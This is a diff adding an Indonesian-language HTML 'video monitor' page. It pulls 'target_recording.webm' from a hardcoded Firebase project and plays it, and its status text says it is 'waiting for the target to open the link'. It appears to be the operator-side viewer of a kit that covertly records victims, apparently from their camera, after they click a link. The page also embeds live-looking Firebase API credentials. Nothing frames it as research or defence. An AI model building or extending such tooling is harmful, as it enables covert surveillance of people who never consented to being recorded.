@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>G45 Video Monitor</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body, html { width: 100%; height: 100%; background: #000; overflow: hidden; display: flex; justify-content: center; align-items: center; }
+        
+        video {
+            max-width: 100%;
+            max-height: 100%;
+            background: #000;
+            transform: scaleX(-1); /* Efek mirror */
+        }
+
+        #status {
+            position: fixed;
+            top: 15px;
+            left: 15px;
+            background: rgba(0,0,0,0.8);
+            color: #ffaa00;
+            font-family: monospace;
+            padding: 6px 12px;
+            border-radius: 4px;
+            font-size: 12px;
+            border: 1px solid #ffaa00;
+            z-index: 10;
+        }
+    </style>
+</head>
+<body>
+    <div id="status">STATUS: MENGAMBIL VIDEO DARI FIREBASE STORAGE...</div>
+    <video id="player" controls autoplay playsinline></video>
+
+    <!-- Firebase SDK v9 Modular (App & Storage) -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+        import { getStorage, ref as sRef, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-storage.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBc4gDdIRxCR6H7RGBe7ejLyI6SrIRyxo0",
+            authDomain: "haij-4beb7.firebaseapp.com",
+            databaseURL: "https://haij-4beb7-default-rtdb.firebaseio.com",
+            projectId: "haij-4beb7",
+            storageBucket: "haij-4beb7.firebasestorage.app",
+            messagingSenderId: "843252587335",
+            appId: "1:843252587335:android:438d0f98d2a2505c034a62"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const storage = getStorage(app);
+        const videoPlayer = document.getElementById('player');
+        const statusDiv = document.getElementById('status');
+
+        async function loadVideo() {
+            try {
+                const videoRef = sRef(storage, 'videos/target_recording.webm');
+                const url = await getDownloadURL(videoRef);
+                
+                videoPlayer.src = url;
+                statusDiv.innerText = "STATUS: VIDEO REKAMAN SIAP DIPUTAR";
+                statusDiv.style.color = "#00ff00";
+                statusDiv.style.borderColor = "#00ff00";
+            } catch (err) {
+                console.error("Belum ada video:", err);
+                statusDiv.innerText = "STATUS: MENUNGGU TARGET MEMBUKA LINK...";
+            }
+        }
+
+        loadVideo();
+    </script>
+</body>
+</html>
